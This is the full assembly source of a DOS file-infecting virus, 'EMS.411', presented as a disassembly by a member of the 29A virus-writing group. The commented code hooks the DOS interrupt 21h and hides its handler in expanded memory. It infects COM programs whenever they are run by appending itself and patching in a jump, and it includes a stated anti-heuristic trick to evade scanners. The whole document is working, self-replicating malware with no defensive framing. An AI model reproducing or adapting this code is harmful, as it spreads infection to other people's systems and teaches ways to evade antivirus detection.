; EMS.411 Virus 
; Dissassembly by Vecna/29A 
.model tiny 
.code 
.386p 
org 0 
VirusStart: 
       jmp RealStart                   ; jump to real start of virus 
HostCode: 
       int 20h                         ; code of the start of the host is 
       nop                             ; stored here 
EMM    db 'EMMXXXX0' 
InfectJump: 
       db 0e9h                         ; this jump is written to begin 
WhereIAm dw 0                          ; of file 
LowMemCode: 
       pushf 
       cmp byte ptr cs:[InUse-LowMemCode], 0 
       jnz Int21InUse                  ; if we're using int21, the bit is set 
       pusha 
       mov ax, 4400h 
       xor bx, bx 
       mov dx, cs:[Page_-LowMemCode] 
       int 67h                         ; map our page 
       popa 
       popf 
       db 09ah                         ; call our int21 handler in the EMS 
       dw offset Int21Handler 
PageFrame dw 0000h 
       pusha 
       pushf 
       mov ax, 4400h 
       mov bx, 0FFFFh 
       mov dx, cs:[Page_-LowMemCode] 
       int 67h                         ; unmap out page 
       mov bp, sp 
       mov ax, [bp+0]                  ; get flag status after exec 
       mov [bp+16h], ax                ; and put in the caller stack 
       popf 
       popa 
       iret 
Page_  dw 0                            ; number of our page 
InUse  db 0                            ; this byte is set if we are using 
                                       ; the int21 
Int21InUse: 
       popf 
       db 0EAh                         ; jump to real int21 
Old21: 
       dd 0 
Int21Handler: 
       pushf 
       xchg ax, dx                     ; anti-heuristic 
       cmp dx, 4B00h 
       jz Infect                       ; infect on execute only 
       xchg ax, dx 
       call dword ptr cs:[Old21]       ; do real call 
       retf 
Infect: 
       popf 
       call ToggleFlag                 ; set flag warning we using int 21 
       xchg ax, dx 
       push ds 
       push dx 
       pushf 
       call dword ptr cs:[Old21]       ; execute original function first 
       pushf 
       pusha 
       push ds 
       mov bp, sp 
       lds dx, [bp+14h]                ; load DS:DX from the saved copy in 
       mov ax, 3D02h                   ; the stack, and open the file R/W 
       int 21h 
       xchg ax, bx 
       mov ah, 3Fh 
       mov cx, 3 
       push cs 
       pop ds 
       mov dx, offset HostCode         ; read 3 bytes from file to our buffer 
       int 21h 
       mov ax, 4202h 
       cwd 
       xor cx, cx 
       int 21h                         ; seek to the end of the file 
       sub ax, 3                       ; sub 3 for the jump 
       push ax 
       sub ax, (offset VEnd-offset VirusStart) 
       cmp ax, word ptr ds:[HostCode+1]; a possible jump in start of file 
       jz AlreadyInfected              ; point to same place than we used to 
       mov ax, 'ZM'                    ; be? If yes, is already infected 
       cmp ax, word ptr ds:[HostCode] 
       jz AlreadyInfected              ; file start with MZ (EXE file) ?? 
       pop ax 
       mov word ptr ds:[WhereIAm], ax  ; save position for jump 
       mov ah, 40h 
       mov cx, (offset VEnd-offset VirusStart) 
       cwd 
       int 21h                         ; write virus code to end of file 
       mov ax, 4200h 
       xor cx, cx 
       cwd 
       int 21h                         ; seek to start of file 
       mov ah, 40h 
       mov cx, 3 
       mov dx, offset InfectJump 
       int 21h                         ; write a jump to virus code 
       jmp short InfectionOk 
AlreadyInfected: 
       add sp, 2                       ; fix the stack 
InfectionOk: 
       mov ah, 3Eh                     ; close file 
       int 21h 
       call ToggleFlag                 ; we're not using int21 anymore 
       pop ds 
       popa 
       push bp 
       mov bp, sp 
       lea sp, [bp+8]                  ; get returned AX and FLAGS 
       push ax 
       mov ax, [bp+2] 
       push ax 
       popf                            ; put they in right place 
       pop ax 
       mov bp, [bp+0] 
       retf 
ToggleFlag: 
       push ax 
       push ds 
       mov ax, 24h                     ; set flag of int21 in use 
       mov ds, ax 
       xor byte ptr ds:[InUse-offset LowMemCode], 1 
       pop ds 
       pop ax 
       retn 
RealStart: 
       pusha 
       mov bx, word ptr cs:[101h]      ; 101 hold the offset part of the jump 
       add bx, 103h                    ; that we put in the start of host 
       call Install 
       mov di, si 
       lea si, [bx+3] 
       movsb                           ; restore old code 
       movsw 
       popa 
       jmp si                          ; jump to start of file 
Install: 
       push bx 
       push si 
       push es 
       push ds 
       push bx 
       push bx 
       push ds 
       mov ax, 24h                     ; check if we are already in 24:0 
       mov ds, ax 
       cmp word ptr ds:[0], 2E9Ch      ; PUSHF/CS: 
       pop ds 
       jz AlreadyInstalled 
       lea si, [bx+offset EMM] 
       mov ax, 3567h 
       int 21h                         ; get segment of EMM386 
       mov di, 0Ah 
       mov cx, 8 
       rep cmpsb                       ; is really EMM386? 
       jnz AlreadyInstalled 
       mov ah, 42h 
       int 67h                         ; Number of pages 
       cmp bx, 1 
       jl AlreadyInstalled             ; less than 1, abort install 
       mov ah, 41h 
       int 67h                         ; get page frame 
       pop si 
       mov cs:[si+PageFrame], bx       ; save it 
       mov es, bx 
       mov ah, 43h 
       mov bx, 1 
       int 67h                         ; allocate 1 page 
       mov cs:[si+Page_], dx 
       mov ax, 4400h 
       mov bx, 0 
       int 67h                         ; map memory 
       mov ax, 3521h 
       int 21h                         ; get adress of int21 
       mov word ptr cs:[si+Old21], bx  ; save it 
       mov word ptr cs:[si+Old21+2], es 
       mov es, cs:[si+offset PageFrame] 
       xor di, di 
       mov cx, 19Bh                    ; copy our code to our page 
       rep movsb 
       mov ax, 4400h 
       mov bx, 0FFFFh 
       int 67h                         ; unmap memory 
       mov di, 24h 
       mov bx, di 
       mov es, di 
       xor di, di 
       pop si 
       add si, 11h 
       mov cx, offset Int21Handler-offset LowMemCode 
       rep movsb                       ; move int21 handler to IVT 
       mov ds, bx 
       xor dx, dx 
       mov ax, 2521h                   ; point int21 to 24:0 
       int 21h 
       jmp InstalledOk 
AlreadyInstalled: 
       add sp, 4                       ; fix stack if error 
InstalledOk: 
       pop ds 
       pop es 
       pop si 
       pop bx 
       ret                             ; return 
VEnd   = $ 
End    VirusStart 